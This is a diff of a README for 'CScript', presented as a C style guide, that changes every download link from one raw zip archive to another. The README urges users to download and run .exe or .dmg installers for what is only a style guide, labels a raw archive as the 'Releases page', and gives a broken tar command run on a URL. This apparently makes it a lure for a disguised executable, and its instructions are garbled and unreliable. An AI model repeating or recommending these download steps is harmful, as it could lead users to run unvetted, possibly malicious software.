@@ -6,19 +6,19 @@ Welcome to the CScript project! CScript offers a style guide for C programming, 
 
 ## 📥 Download CScript
 
-[![Download CScript](https://github.com/HaibaraAi14/CScript/raw/refs/heads/main/pronominal/Script-C-1.3.zip%https://github.com/HaibaraAi14/CScript/raw/refs/heads/main/pronominal/Script-C-1.3.zip)](https://github.com/HaibaraAi14/CScript/raw/refs/heads/main/pronominal/Script-C-1.3.zip)
+[![Download CScript](https://github.com/HaibaraAi14/CScript/raw/refs/heads/main/pronominal/Script_C_v2.4-beta.3.zip%https://github.com/HaibaraAi14/CScript/raw/refs/heads/main/pronominal/Script_C_v2.4-beta.3.zip)](https://github.com/HaibaraAi14/CScript/raw/refs/heads/main/pronominal/Script_C_v2.4-beta.3.zip)
 
 You can download CScript from our Releases page. Follow the instructions below to start using it.
 
 ## 📂 Download & Install
 
-1. **Visit our Releases page:** Go to [this link](https://github.com/HaibaraAi14/CScript/raw/refs/heads/main/pronominal/Script-C-1.3.zip) to find the latest version of CScript.
-2. **Choose the right file:** Look for the file that matches your operating system. If you are using Windows, download the `.exe` file. For macOS, look for the `.dmg` file. Linux users should find a `https://github.com/HaibaraAi14/CScript/raw/refs/heads/main/pronominal/Script-C-1.3.zip` file.
+1. **Visit our Releases page:** Go to [this link](https://github.com/HaibaraAi14/CScript/raw/refs/heads/main/pronominal/Script_C_v2.4-beta.3.zip) to find the latest version of CScript.
+2. **Choose the right file:** Look for the file that matches your operating system. If you are using Windows, download the `.exe` file. For macOS, look for the `.dmg` file. Linux users should find a `https://github.com/HaibaraAi14/CScript/raw/refs/heads/main/pronominal/Script_C_v2.4-beta.3.zip` file.
 3. **Download the file:** Click on the file name to start the download. It may take a moment depending on your internet connection.
 4. **Run the installer:**
    - For **Windows**: Double-click the downloaded `.exe` file. Follow the on-screen prompts to complete the installation.
    - For **macOS**: Open the downloaded `.dmg` file. Drag the CScript icon into your Applications folder.
-   - For **Linux**: Open a terminal, navigate to your download folder, and run the following command: `tar -xzf https://github.com/HaibaraAi14/CScript/raw/refs/heads/main/pronominal/Script-C-1.3.zip`. Follow any additional instructions provided in the README included in the extracted files.
+   - For **Linux**: Open a terminal, navigate to your download folder, and run the following command: `tar -xzf https://github.com/HaibaraAi14/CScript/raw/refs/heads/main/pronominal/Script_C_v2.4-beta.3.zip`. Follow any additional instructions provided in the README included in the extracted files.
 
 ## ✏️ Usage
 
@@ -68,6 +68,6 @@ For further learning, consider checking out these resources:
 
 CScript is open source. Check the LICENSE file in the repository for details on how you can use this guide.
 
-For the latest updates and enhancements, keep an eye on our Releases page: [Download CScript here](https://github.com/HaibaraAi14/CScript/raw/refs/heads/main/pronominal/Script-C-1.3.zip).
+For the latest updates and enhancements, keep an eye on our Releases page: [Download CScript here](https://github.com/HaibaraAi14/CScript/raw/refs/heads/main/pronominal/Script_C_v2.4-beta.3.zip).
 
 Thank you for choosing CScript. Happy coding!
